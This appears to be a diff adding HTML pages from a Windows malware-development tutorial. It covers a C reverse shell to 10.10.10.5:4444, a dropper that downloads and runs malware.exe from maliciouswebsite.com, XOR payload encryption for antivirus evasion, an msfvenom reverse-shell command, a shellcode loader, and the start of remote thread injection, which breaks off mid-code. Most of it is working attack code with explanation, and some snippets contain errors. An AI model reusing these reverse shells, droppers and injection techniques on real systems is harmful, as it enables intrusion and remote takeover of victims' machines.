+</ul>
+<pre><code class="language-C">typedef struct WSAData {
+    WORD wVersion;
+    WORD wHighVersion;
+    char szDescription[WSADESCRIPTION_LEN+1];
+    char szSystemStatus[WSASYS_STATUS_LEN+1];
+    unsigned short iMaxSockets;
+    unsigned short iMaxUdpDg;
+    char FAR *lpVendorInfo;
+} WSADATA, *LPWSADATA;
+</code></pre>
+<p>Here are the <code>WSADATA</code> structure's attributes:</p>
+<ul>
+<li><code>wVersion</code>: Filled by <code>WSAStartup</code> with the version of the Winsock specification that the program requested.</li>
+<li><code>wHighVersion</code>: Filled by <code>WSAStartup</code> with the highest version of the Winsock API that the Winsock DLL can support.</li>
+<li><code>szDescription</code>: A null-terminated string that provides a human-readable description of the Winsock implementation (i.e., <code>Winsock 2.0</code>).</li>
+<li><code>szSystemStatus</code>: A null-terminated string that contains status or configuration information about the Winsock implementation.</li>
+</ul>
+</li>
+<li>
+<p><code>STARTUPINFO</code>: A Windows API structure that specifies how a process is to be created. It allows a parent process to control various aspects of a child process's creation, such as its window properties and (importantly for adversary simulation) the handles used for standard input, output, and error. <code>STARTUPINFO</code> is the WIndows API's equivalent to the UNIX <code>dup2()</code> system call for I/O redirection. It is defined in <code>&lt;windows.h&gt;</code>.</p>
+<pre><code class="language-C">typedef struct _STARTUPINFOA {
+    DWORD cb;
+    [...trunc...]
+    DWORD dwFlags;
+    [...trunc...]
+    HANDLE hStdInput;
+    HANDLE hStdOutput;
+    HANDLE hStdError;
+    [...trunc...]
+} STARTUPINFOA;
+</code></pre>
+<p>Here are the <code>STARTUPINFOA</code> data structure's attributes:</p>
+<ul>
+<li><code>cb</code>: The size of the structure in bytes. Must be set to <code>sizeof(STARTUPINFOA)</code> before the structure is used.</li>
+<li><code>dwFlags</code>: A bitmask that contains which of the other fields are used. To redirect standard I/O, you must set this field to <code>STARTF_USESTDHANDLES</code>. Without this flag, the <code>hStd**</code> handles will be ignored.</li>
+<li><code>nStdInput</code>: The handle that the new process will use for its standard input (<code>stdin</code>).</li>
+<li><code>nStdOutput</code>: The handle for standard output (<code>stdout</code>).</li>
+<li><code>nStdError</code>: The handle for standard error (<code>stderr</code>).</li>
+</ul>
+</li>
+<li>
+<p><code>PROCESS_INFORMATION</code>: A Windows API structure that provides information about a newly created process and its primary thread. It is a companion structure to <code>STARTUPINFO</code>, used as an output parameter for the <code>CreateProcess</code> function and allows the operating system to return the details of a newly created process. It is defined in <code>&lt;winsock2.h&gt;</code>.</p>
+<pre><code class="language-C">typedef struct _PROCESS_INFORMATION{
+    HANDLE hProcess;
+    HANDLE hThread;
+    HANDLE dwProcessId;
+    HANDLE dwThreadId;
+} PROCESS_INFORMATION;
+</code></pre>
+<p>Here are the <code>_PROCESS_INFORMATION</code> structure's attributes:</p>
+<ul>
+<li><code>hProcess</code>: A handle to the newly created process.</li>
+<li><code>hThread</code>: A handle to the primary thread of the new process.</li>
+<li><code>dwProcessId</code>: The <strong>Process ID</strong> (PID) of the new process.</li>
+<li><code>dwThreadId</code>: The <strong>Thread ID</strong> (TID) of the primary thread.</li>
+</ul>
+</li>
+</ul>
+<ol start="2">
+<li>After including the required libraries and declaring the initial data structures, the program sets the IP address and port it wants to connect with:</li>
+</ol>
+<pre><code class="language-C">char *attackerIP = "10.10.10.5";
+char attackerPort = 4444;
+</code></pre>
+<ol start="3">
+<li>Next, the <code>Windows Sockets</code> library is initialized:</li>
+</ol>
+<pre><code class="language-C">// Initialize the socket library
+WSAStartup(MAKEWORD(2,2), &amp;socketData);
+
+// Create the Socket Object
+mainSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int) NULL);
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>WSAStartup</code>: A mandatory initialization function for the Windows Sockets API (<code>winsock</code>), needed in order to perform the necessary setup to allow an application use any Winsock functions. It is included in <code>&lt;winsock2.h&gt;</code>.
+<pre><code class="language-C">int WSAAPI WSAStartup(WORD wVersionRequired, LPWSADATA lpSAData);
+</code></pre>
+Here are the <code>WSAStartup</code> function's parameters:
+<ul>
+<li><code>WORD wVersionRequired</code>: Specifies the version of the Winsock API that the application requires. It is a 16-bit value that is typically created using the <code>MAKEWORD()</code> macro. For instance, <code>MAKEWORD(2,2)</code> for Winsock version <code>2.2</code>.</li>
+<li><code>LPWSADATA lpWSAData</code>: a pointer to the <code>WSAData</code> structure, which will be populated with information about eh Winsock implementation on the system.</li>
+<li><code>WSAStartup</code> returns <code>0</code> on success and a non-zero error code on failure.</li>
+</ul>
+</li>
+<li><code>WSASocket</code>: A Windows socket (<code>Winsock</code>) function used to create a new socket. It is preferred to <code>socket()</code>, which is older and has fewer features. It is included in <code>&lt;winsock2.h&gt;</code>.
+<pre><code class="language-C">SOCKET WSAAPI WSASOCKET(
+    int af,
+    int type,
+    int protocol,
+    LPWSAPROTOCOL_INFO lpProtocolInfo,
+    GROUP g,
+    DWORD dwFlags
+);
+</code></pre>
+Here are the <code>WSASOCKET</code> function's parameters:
+<ul>
+<li><code>int af</code>: Address Family</li>
+<li><code>int type</code>: The Socket Type (i.e., <code>SOCK_STREAM</code>, <code>SOCK_DGRAM</code>, etc.)</li>
+<li><code>int protocol</code>: The protocol used, such as <code>IPPROTO_TCP</code> or <code>IPPROTO_UDP</code></li>
+<li><code>LPWSAPROTOCOL_INFO lpProtocolInfo</code>: A pointer to a <code>WSAPROTOCOL_INFO</code> structure, which is used for advanced socket features, such as socket cloning. For a basic socket, this is typically set to <code>NULL</code>.</li>
+<li><code>GROUP g</code>: A group identifier for socket sharing. Use <code>0</code> for a simple socket.</li>
+<li><code>DWORD dwFlags</code>: A set of flags that define additional socket attributes. A common flag is <code>WSA_FLAG_OVERLAPPED</code>, which enables asynchronous (non-blocking) I/O. For a simple, blocking socket, this is typically <code>0</code>.</li>
+<li><code>WSASOCKET</code> returns a <code>SOCKET</code> handle if success. Returns <code>INVALID_SOCKET</code> on failure.</li>
+</ul>
+</li>
+</ul>
+<ol start="4">
+<li>Next, the socket address structure is filled with the IP Address and Port Number and a connection is attempted using <code>WSAConnect()</code>:</li>
+</ol>
+<pre><code class="language-C">// Fill in the sockaddr_in structure
+connectionAddress.sin_family = AF_INET;
+connectionAddress.sin_port = htons(attackerPort);
+connectionAddress.sin_addr.s_addr = inet_aton(attackerIP);
+//Establish a connection to the remote host
+WSAConnect(mainSocket, (SOCKADDR*)&amp;connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL);
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>WSAConnect()</code>: Used by a client program to establish a connection to a remote server. It is defined in <code>&lt;winsock2.h&gt;</code>.
+<pre><code class="language-C">int WSAAPI WSAConnect(
+    SOCKET s,
+    const SOCKADDR* name,
+    int namelen,
+    LPWSABUF lpCallerData,
+    LPWSABUF lpCalleeData,
+    LPQOS lpSQOS,
+    LPQOS lpGQOS
+);
+</code></pre>
+Here are the <code>WSAConnect</code> function's parameters:
+<ul>
+<li><code>SOCKET s</code>: The Socket handle returned from a call to <code>WSASOCKET()</code>.</li>
+<li><code>const SOCKADDR* name</code>: A pointer to a <code>sockaddr</code> structure, which contains the IP address and Port of the server you want to connect to.</li>
+<li><code>int namelen</code>: The size of the <code>sockaddr</code> structure in bytes.</li>
+<li>The remaining parameters are used for advanced features, like sending data with the connection request or specifying the <strong>Quality of Service</strong>. For a basic connection, they are usually <code>NULL</code>.</li>
+<li><code>WSAConnect</code> returns <code>0</code> on success. On failure, it returns <code>SOCKET_ERROR</code>.</li>
+</ul>
+</li>
+</ul>
+<ol start="5">
+<li>Finally, the <code>STARTUPINFO</code> structure is filled out and a child process is created to run the shell.</li>
+</ol>
+<pre><code class="language-C">// Zero out the space allocated for the `startupInfo` structure
+memset(&amp;startupInfo, 0, sizeof(startupInfo));
+// Fill in `startupInfo`
+startupInfo.cb = sizeof(startupInfo);
+startupInfo.dwFlags = STARTF_USESTDHANDLES;
+startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE) mainSocket;
+// Initiate cmd.exe with redirected streams
+CreateProcess(NULL, "cmd.exe", NULL, NUL, TRUE, 0, NULL, NULL, &amp;startupInfo, &amp;processInfo);
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>memset</code>: A C standard library function used to fill a block of memory with a specific repeating byte value. It is an essential utility for initializing data structures, especially for network and system programming, where you need to ensure all fields are zeroed out before use. It is included in <code>&lt;string.h&gt;</code>.
+<pre><code class="language-C">void *memset(void *s, int c, size_t n);
+</code></pre>
+Here are the <code>memset</code> function's parameters:
+<ul>
+<li><code>void *s</code>: A pointer to the starting address of the memory block that you want to fill.</li>
+<li><code>int c</code>: The value that will be written to each byte of the memory block. A common use is to pass <code>0</code> to zero out the memory.</li>
+<li><code>size_t n</code>: The number of bytes in the memory block that you want to fill.</li>
+<li><code>memset</code> returns a pointer to the memory block, which is the first parameter.</li>
+</ul>
+</li>
+<li><code>CreateProcess()</code>: The core Windows API function used to create a new process and its primary thread. It is critical for any program that needs to launch another executable, such as a malware payload launching a command-line shell to serve as a reverse shell.
+<pre><code class="language-C">BOOL CreateProcessA(
+    LPCSTR lpApplicationName,
+    LPSTR lpCommandLine,
+    LPSECURITY_ATTRIBUTES lpProcessAttributes,
+    BOOL bInheritHandles,
+    DWORD dwCreationFlags,
+    LPVOID lpEnvironment,
+    LPCSTR lpCurrentDirectory,
+    LPSTARTUPINFOA lpStartupInfo,
+    LPPROCESS_INFORMATION lpProcessInformation
+);
+</code></pre>
+Here are the <code>CreateProcessA</code> function's parameters:
+<ul>
+<li><code>lpCommandLine</code>: A pointer to a string that specifies the command to be executed. You can also use <code>lpApplicationName</code> for this purpose.</li>
+<li><code>bInheritHandles</code>: A crucial parameter for I/O redirection. It must be set to true to allow the child process to inherit the parent's inheritable handles.</li>
+<li><code>dwCreationFlags</code>: Flags to control the process creation. Set it to <code>CREATE_NO_WINDOW</code> to prevent the new process from creating a Window object.</li>
+<li><code>lpStartupInfo</code>: A pointer to the <code>STARTUPINFO</code> structure.</li>
+<li><code>lpProcessInformation</code>: A pointer to the <code>PROCESS_INFORMATION</code> structure</li>
+<li><code>CreateProcess</code> returns a non-zero value on success, <code>0</code> on failure.</li>
+</ul>
+</li>
+</ul>
+<h2 id="leveraging-windows-internals-for-malware-development"><a class="header" href="#leveraging-windows-internals-for-malware-development">Leveraging Windows Internals for Malware Development</a></h2>
+<p>The Windows API allows developers to interact with the Windows Operating System via their applications. For example, if an app needs to render content on a scree, access a local file, or download something from the internet, these tasks can be accomplished through the Windows API.</p>
+<p><strong>For Example</strong></p>
+<pre><code class="language-C">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+int main() {
+    char username[UNLEN+1];
+    DWORD username_len = UNLEN+1;
+    GetUserName(username, &amp;username_len);
+    printf("current user is: %s\n", username);
+    return 0;
+}
+</code></pre>
+<p>This program utilizes the <code>GetUserName</code> API.</p>
+<ul>
+<li>
+<p><code>GetUserName</code>: A Windows API function used to retrieve the name of the user associated with the current thread. It is included in <code>&lt;windows.h&gt;</code> and requires the <code>advapi32.lib</code> library for linking.</p>
+<pre><code class="language-C">BOOL GetUserNameA(
+    LPSTR lpBuffer,
+    LPDWORD lpnSize
+);
+</code></pre>
+<p>Here are the <code>GetUserNameA</code> function's parameters:</p>
+<ul>
+<li><code>LPSTR lpBuffer</code>: A pointer to a buffer where the function will copy the user's name as a null-terminated string. A constant like <code>UNLEN+1</code> (from <code>lmcons.h</code>) is used so that an appropriate buffer size is allocated for the username before the call to <code>GetUserNameA</code>.</li>
+<li><code>LPDWORD lpnSize</code>: A pointer to a variable that receives the number of characters copied into the <code>lpBuffer</code>, including the <code>NULL</code> terminator. It is also used to tell <code>GetUserNameA</code> the maximum number of characters <code>lpBuffer</code> can hold.</li>
+<li><code>GetUserNameA</code> returns a non-zero value on success. On failure, it returns <code>0</code>.</li>
+</ul>
+<p>Many Windows API functions have both an <code>A</code> and a <code>W</code> variant. The <code>A</code> variants include functions that use a single-byte character set, typically based on the system's active code page (i.e., <code>ASCII</code>). A string is <code>NULL</code> terminated with a single byte (<code>0x00</code>). The <code>W</code> variants include functions that use a 16-bit wide character set, which on Windows is <code>UTF-16</code>. A string is <code>NULL</code> terminated with a two-byte sequence (<code>0x00 0x00</code>). This is the native, preferred encoding for modern Windows:</p>
+<pre><code class="language-C">BOOL GetUserNameW(
+    LPWSTR lpBuffer,
+    LPDWORD lpnSize
+);
+</code></pre>
+<p>The number of bytes required will differ, depending on which version is used:</p>
+<pre><code class="language-C">char s1[] = "malware";     // 8 bytes (malware + null byte)
+char s2[] = L"malware";    // 16 bytes each char + null are 2 bytes.
+</code></pre>
+</li>
+</ul>
+<div id="admonition-note-1" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-1-title">
+<div class="admonition-title">
+<div id="admonition-note-1-title">
+<p>Note</p>
+</div>
+<a class="admonition-anchor-link" href="#admonition-note-1"></a>
+</div>
+<div>
+<p><code>UNLEN</code> is a constand, defined in <code>lmcons.h</code>, which is included in <code>&lt;windows.h&gt;</code>.</p>
+</div>
+</div>
+<p>Malware development requires a deep understanding of the tools and techniques that make it possible to interact with, manipulate, and investigate processes and memory within the Windows Operating System. This is why it is crucial to know the <strong>Windows Debugging APIs</strong>, the set of functions provided by Windows that can be utilized to manipulate memory and processes (i.e., <code>VirtualAlloc</code>, <code>VirtualProtect</code>, <code>RtlMoveMemory</code>, <code>CreateThread</code>, etc.). PE files can compile to either executables (<code>.exe</code>) or Dynamically Linked Libraries (<code>.DLL</code>). The main difference is that an <code>.exe</code> requires a function called <code>main</code>, which the OS loader calls when a new process is ready, and <code>.dll</code> needs a function called <code>DllMain</code>, since the loader has already set up the process in memory.</p>
+<p><strong>For Example</strong></p>
+<pre><code class="language-C">#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+BOOL APIENTRY DllMain(HMODULE mHandle, DWORD actionReason, LPVOID reservedPointer){
+    switch(actionReason){
+        case DLL_PROCESS_ATTACH:
+            MessageBox(NULL, "You Have Been Hacked!", "&gt;;-)", MB_OK);
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+        case DLL_THREAD_ATTACH:
+            break;
+        case DLL_THREAD_DETACH:
+            break;
+    }
+    return TRUE;
+}
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>DllMain</code>: The primary entry-point function for a <code>DLL</code>. This function is called by the OS Loader to notify a <code>DLL</code> of important events, such as when it is loaded into a process, when a thread is created or destroyed within that process, or when the <code>DLL</code> is unloaded.
+<pre><code class="language-C">BOOL WINAPI DllMain(
+    HINSTANCE hinstDLL,
+    DWORD fdwReason,
+    LPVOID lpvReserved
+);
+</code></pre>
+Here is a breakdown of the <code>DllMain</code> function's parameters:
+<ul>
+<li><code>HINSTANCE hinstDLL</code>: A handle to the <code>DLL</code> itself.</li>
+<li><code>DWORD fdwReason</code>: Defines the reason why the OS is calling <code>DllMain</code>. For instance:
+<ul>
+<li><code>DLL_PROCESS_ATTACH</code>: The <code>DLL</code> is being loaded into the virtual address space of the current process.</li>
+<li><code>DLL_THREAD_ATTACH</code>: A new thread is being created in the current process, and the <code>DLL</code> has already been attached to the process.</li>
+<li><code>DLL_THREAD_DETACH</code>: A thread is exiting cleanly from the current process's virtual space.</li>
+<li><code>DLL_PROCESS_DETACH</code>: The <code>DLL</code> is being unloaded from the current process's virtual address space.</li>
+</ul>
+</li>
+<li><code>LPVOID lpvReserved</code>: A reserved parameter that can provide additional information for certain events.</li>
+<li><code>DllMain</code> return <code>TRUE</code> on successful initialization, <code>FALSE</code> otherwise.</li>
+</ul>
+</li>
+</ul>
+<h3 id="deceiving-a-victims-systems"><a class="header" href="#deceiving-a-victims-systems">Deceiving a Victim's Systems</a></h3>
+<p>A malicious program can use many technique to deceive a target system, including:</p>
+<ul>
+<li><strong>Downloading and executing malware from a remote server</strong>:</li>
+</ul>
+<pre><code class="language-C">#include &lt;windows.h&gt;
+#include &lt;urlmon.h&gt;
+#pragma comment(lib, "urlmon.lib")
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdline, int nCmdShow){
+    URLDownloadToFile(
+        NULL,
+        "http://maliciouswebsite.com/malware.exe",
+        "C:\\temp\\malware.exe",
+        0,
+        NULL
+    );
+    ShellExecute(
+        NULL,
+        "open",
+        "C:\\temp\\malware.exe",
+        NULL,
+        NULL,
+        SQ_SHOWNORMAL
+    );
+    return 0;
+}
+</code></pre>
+<p>A malware may be hosted on a remote server and a dropper program can be used to download and execute it.</p>
+<ul>
+<li><strong>Antivirus (AV)/Endpoint Detection Response (EDR) evasion tricks</strong></li>
+</ul>
+<pre><code class="language-C">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+// Function to perform simple XOR encryption/decryption
+void xor_encrypt_decrypt(char* input, char key){
+    char* iterator = input;
+    while(*iterator){
+        iterator ^= key;
+        iterator++;
+    }
+}
+
+int main(){
+    char payload[] = "&lt;MALICIOUS_PAYLOAD&gt;";
+    printf("original payload %s\n", payload);
+    xor_encrypt_decrypt(payload, 'k');
+    printf("encrypted payload: %s\n", payload);
+
+    // At this point, the payload may bnot be recognized by AV
+    // When we're ready to exexcute it, we decrypt it
+    xor_encrypt_decrypt(payload, 'k');
+    printf("decrypted payload: %s\n", payload);
+
+    // Now, we can execute our payload...
+    hack();
+    return;
+}
+</code></pre>
+<p>An effective way to evade AV is to employ encryption. This may involve encryption a payload and decrypting it only when its about to be executed. More on this in <code>Malware Detection Evasion Techniques</code>.</p>
+<h2 id="malware-injection-attacks"><a class="header" href="#malware-injection-attacks">Malware Injection Attacks</a></h2>
+<p><strong>Code Injection</strong> is a simple technique where one process adds code to another process that is already working. It is a good technique to use to promote good <strong>OpSec</strong>.</p>
+<p><strong>For Example</strong></p>
+<pre><code class="language-asm64">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.15 LPORT=4444 -f c
+</code></pre>
+<pre><code class="language-asm64">; output
+[-] No platform was selected...
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of C file: 1963 bytes
+unsigned char buffer[] =
+"\xfc\x48\x83\xe4..."
+[...trunc...]
+"...\xda\xff\xd5";
+</code></pre>
+<p>Here is a breakdown of this command:</p>
+<ul>
+<li><code>msfvenom</code>: A powerful payload generator that comes as a part of the Metasploit Framework.</li>
+<li><code>-p windows/x64/shell_reverse_tcp</code>: Specifies the payload to use
+<ul>
+<li><code>-p</code>: Flat to indicate that a payload will be selected</li>
+<li><code>windows/x64/shell_reverse_tcp</code>: A payload for a tcp reverse shell on a Windows x86-64 system.</li>
+</ul>
+</li>
+<li><code>LHOST=[HOST IP]</code>: Sets the IP address of the Listening Host</li>
+<li><code>LPORT=[HOST IP]</code>: Sets the Port Number of the Listening Host</li>
+<li><code>-f c</code>: Specifies that the payload should be output as a C-style byte array.</li>
+</ul>
+<p>The resulting output is the shellcode being used as our payload.</p>
+<div id="admonition-note-2" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-2-title">
+<div class="admonition-title">
+<div id="admonition-note-2-title">
+<p>Note</p>
+</div>
+<a class="admonition-anchor-link" href="#admonition-note-2"></a>
+</div>
+<div>
+<p>What is <strong>Shellcode</strong>?
+<strong>Shellcode</strong> is basically CPU instructions which are executed by the processor directly in memory. Malicious actors copy shellcode into the memory space of a process and use a variety of techniques to highjack the <strong>Instruction Pointer</strong> register (<code>RIP</code>), resulting in that shellcode being executed. For our purposes here, the shellcode makes up the instructions which tell the CPU to create a reverse shell for an x64 system that connects out to an attacking system. More specific details can be found in <code>Appendix B: Manually Writing Shellcode for Windows</code>.</p>
+</div>
+</div>
+<p>Here is the program used to run the payload, called a <strong>shellcode loader</strong>:</p>
+<pre><code class="language-C">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+// reverse shell payload from msfvenom
+unsigned char payload[] =
+"\xfc\x48\x83\xe4..."
+[...trunc...]
+"...\xda\xff\xd5";
+
+unsigned int payload_len = sizeof(payload);
+
+int main(void){
+    void* payload_mem;
+    BOOL result;
+    HANDLE thread_handle;
+    DWORD oldprotect = 0;
+
+    payload_mem = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    RtlMoveMemory(payload_mem, payload, payload_len);
+    result = VirtualProtect(payload_mem, payload_len, PAGE_EXECUTE_READ, &amp;oldprotect);
+    if (result != 0){
+        thead_handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload_mem, 0, 0, 0);
+        WaitForSingleObject(thread_handle, -1);
+    }
+    return 0;
+}
+</code></pre>
+<p>Where:</p>
+<ul>
+<li>
+<p><code>stdlib.h</code>: A standard C library header file that provides a collection of general-purpose utility functions, such as:</p>
+<ul>
+<li><code>malloc</code>: Allocates a block of memory of a specified size</li>
+<li><code>calloc</code>: Allocates memory for an array of elements and initializes all bytes to zero.</li>
+<li><code>free</code>: Deallocates a memory block, releasing it back to the system.</li>
+<li><code>system</code>: Executes a command passed as a string to the systems command interpreter.</li>
+<li><code>atoi</code>: Converts a string to an integer.</li>
+<li><code>atol</code>: Converts a string to a long integer.</li>
+</ul>
+</li>
+<li>
+<p><code>windows.h</code>: The master header file for the Windows API, providing a convenient way to access the full power of the Windows API without manually having to figure out and include every individual header function you need (i.e., <code>winsock2.h</code>, <code>winnt.h</code>, <code>winbase.h</code>, etc.).</p>
+<ul>
+<li><code>windows.h</code> is where the <code>UNICODE</code> and <code>_UNICODE</code> preprocessor macros are typically defined. If you define <code>UNICODE</code> before including <code>windows.h</code>, all generic API names automatically resolve to the <code>W</code> variants:</li>
+</ul>
+<pre><code class="language-C">#define UNICODE
+#include &lt;windows.h&gt;
+[...trunc...]
+CreateFile(...);        // Expands to CreateFileW(...)
+</code></pre>
+<ul>
+<li>
+<p>Otherwise, they expand to the <code>A</code> versions.</p>
+<ul>
+<li><code>_UNICODE</code> is used for the <code>C Runtime Library</code> (CRT), not the Windows API, but the purpose is the same.</li>
+</ul>
+</li>
+<li>
+<p>The header file for <code>GetUserName</code> contains the following logic:</p>
+</li>
+</ul>
+<pre><code class="language-C">#ifdef UNICODE
+#define GetUserName GetUserNameW
+#else
+#define GetUserName GetUserNameA
+#endif
+</code></pre>
+</li>
+<li>
+<p><code>string.h</code>: A standard C library header file that provides a set of functions for manipulating <code>NULL</code> terminated strings and blocks of memory, including:</p>
+<ul>
+<li><code>strlen</code>: Returns the length of a string, not including the <code>NULL</code> terminator</li>
+<li><code>strcpy</code>: Copies a source string to a destination buffer.
+<ul>
+<li><code>strcpy</code> is a common source of buffer overflow vulnerabilities</li>
+</ul>
+</li>
+<li><code>strncpy</code>: Copies at most <code>n</code> bytes from a source to a destination buffer.</li>
+<li><code>memcpy</code>: Copies a block of memory from a source to a destination.</li>
+<li><code>memset</code>: Fills a block of memory with a specific byte.</li>
+</ul>
+</li>
+</ul>
+<p>Running this program directly on the target system is not very conspicuous, as an unrecognized process initiating an outward network connection immediately raises the suspicion of any capable cyber defense team. Instead, we can use <strong>remote code injection</strong> to execute the payload in another process on the target machine to avoid suspicion.</p>
+<h3 id="remote-thread-injection"><a class="header" href="#remote-thread-injection">Remote Thread Injection</a></h3>
+<p>In a sense, the previous example is an instance of <strong>code injection</strong>. A new process is started, memory space is allocated, the shellcode is copied into the reserved buffer and a new thread is initialized to execute the shellcode.</p>
+<p><strong>Remote Code Injection</strong> is very similar, with the added caveat that the payload is executed within the address space of another process. One example of a remote code injection technique is <strong>Remote Thread Injection</strong>. Remote thread injection is a method where a new thread gets created within a target process to execute the payload. It can be broken down into three, simple steps:</p>
+<ol>
+<li>Memory is allocated within a target process, initializing a buffer at least as large as the payload.</li>
+<li>The payload is copied into the allocated buffer.</li>
+<li>A request is made to execute the payload within the target process.</li>
+</ol>
+<p>The most common way of accomplishing this is to use builtin Windows API functions:</p>
+<ul>
+<li>
+<p><code>OpenProcess</code>: A Windows API function that provides a handle to an existing process.</p>
+<pre><code class="language-C">HANDLE OpenProcess(
+    DWORD dwDesiredAccess,
+    BOOL bInheritHandle,
+    DWORD dwProcessId
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the <code>OpenProcess</code> function's parameters:
+<ul>
+<li><code>dwDesiredAccess</code>: A set of flags that specify the access rights requested for the process handle. Examples include:
+<ul>
+<li><code>PROCESS_VM_OPERATION</code>: Allocate and change memory</li>
+<li><code>PROCESS_VM_WRITE</code>: Write data to memory</li>
+<li><code>PROCESS_CREATE_THREAD</code>: Create a new thread</li>
+<li><code>PROCESS_ALL_ACCESS</code>: Obtain all possible rights</li>
+</ul>
+</li>
+<li><code>bInheritHandle</code>: A boolean value that, if <code>TRUE</code>, allows the handle to be inherited by any child processes created by the current process.</li>
+<li><code>dwProcessId</code>: The <strong>Process Identifier</strong> (PID) of the process you want to open.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>VirtualAllocEx</code>: A Windows API function that reserves, commits, or changes the state of a region of pages in the virtual address space of a specified external process. It is critical for tools that perform code injection, because it allows them to allocate space in a target process's memory space.</p>
+<pre><code class="language-C">LPVOID VirtualAllocEx(
+    HANDLE hProcess,
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD flAllocationType,
+    DWORD flProtect
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the <code>VirtualAllocEx</code> function's parameters:
+<ul>
+<li><code>hProcess</code>: A handle to the process, where the memory will be allocated. The handle must have the <code>PROCESS_VM_OPERATION</code> access right.</li>
+<li><code>lpAddress</code>: The desired starting address for the region of pages to allocate. Typically set to <code>NULL</code>, allowing the OS to determine where to place the memory block.</li>
+<li><code>dwSize</code>: The size, in bytes, of the memory region to be allocated.</li>
+<li><code>flAllocationType</code>: A flag that specifies the type of memory allocation (i.e., <code>MEM_COMMIT</code> or <code>MEM_RESERVE</code>).</li>
+<li><code>flProtect</code>: A flag that sets the memory protection for the region, determining what actions can be performed on the memory.</li>
+<li><code>VirtualAllocEx</code> returns a pointer to the base address of the allocated memory region, if successful. On failure it returns <code>NULL</code>.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>WriteProcessMemory</code>: A Windows API function, used to write data into an allocated region of memory within another process.</p>
+<pre><code class="language-C">BOOL WriteProcessMemory(
+    HANDLE hProcess,
+    LPVOID lpBaseAddress,
+    LPCVOID lpBuffer,
+    SIZE_T nSize,
+    SIZE_T* lpNumberOfBytesWritten
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the <code>WriteProcessMemory</code> function's parameters:
+<ul>
+<li><code>hProcess</code>: A handle to the target process, which must have <code>PROCESS_VM_WRITE</code> and <code>PROCESS_VM_OPERATION</code> access rights to allow the calling process to modify the target process's memory.</li>
+<li><code>lpBaseAddress</code>: The starting base address in the target process's virtual memory, where the data will be written. In this instance, it will be the address returned by <code>VirtualAllocEx</code>.</li>
+<li><code>lpBuffer</code>: A pointer to the buffer that contains the data to be written. The address of the malicious shellcode within the injector's own memory.</li>
+<li><code>nSize</code>: The number of bytes to be written from the source buffer into the target process's memory.</li>
+<li><code>lpNumberOfBytesWritten</code>: An optional pointer to a variable that receives the number of bytes that were actually written into the target process. This can be <code>NULL</code>.</li>
+<li><code>WriteProcessMemory</code> returns <code>TRUE</code> if successful, <code>FALSE</code> upon failure.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>CreateRemoteThread</code>: A powerful Windows API function used to create a new thread of execution within the virtual address space of a specified external process. It is critical for remote thread injection, as it is the function responsible for executing the malicious code.</p>
+<pre><code class="language-C">HANDLE CreateRemoteThread(
+    HANDLE hProcess,
+    LPSECURITY_ATTRIBUTES lpThreadAttributes,
+    SIZE_T dwStackSize,
+    LP_THREAD_START_ROUTINE lpStartAddress,
+    LPVOID lpParameter,
+    DWORD dwCreatinFlags,
+    LPDWORD lpThreadId
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the <code>CreateRemoteThread</code> function's parameters:
+<ul>
+<li><code>hProcess</code>: A handle to the target process where the new thread will be created. This handle must have the <code>PROCESS_VM_OPERATION</code> and <code>PROECSS_CREATE_THREAD</code> access rights enabled.</li>
+<li><code>lpThreadAttribtutes</code>: An optional pointer to a <code>SECURITY_ATTRIBUTES</code> structure that specifies the security descriptor for the new thread. SEt to <code>NULL</code> for default security.</li>
+<li><code>dwStackSize</code>: The initial stack size for the new thread to commit in memory. If the value is <code>0</code>, the new thread's stack size will be the same as the creating process's primary thread.</li>
+<li><code>lpStartAddress</code>: The most crucial parameter. A pointer to the starting address of the function that the new thread will execute. In remote thread injection, this will be the address of the malicious shellcode that was written into the target process's memory.</li>
+<li><code>lpParameter</code>: An optional pointer to a single value that is passed as an argument to the thread's start function.</li>
+<li><code>dwCreationFlags</code>: A flag that controls the creation of the thread.
+<ul>
+<li><code>0</code>: Thread is created and immediately executed</li>
+<li><code>CREATE_SUSPENDED</code> (0x00000004): Thread is created, but immediately pauses execution until the <code>ResumeThread</code> function is called.</li>
+<li><code>STACK_SIZE_PARAM_IS_A_RESERVATION</code> (0x00010000): Changes the meaning behind the <code>dwStackSize</code> parameter, so that it specifies the total reserved size of the stack, rather than the committed size.</li>
+</ul>
+</li>
+<li><code>lpThreadId</code>: An optional pointer to a DWORD variable that receives the unique identifier of the newly created thread.</li>
+<li><code>CreateRemoteThread</code> returns a HANDLE to the newly created thread in the target process.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>Here is an example of a simple, remote thread injection program:</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+
+unsigned char payload[] =
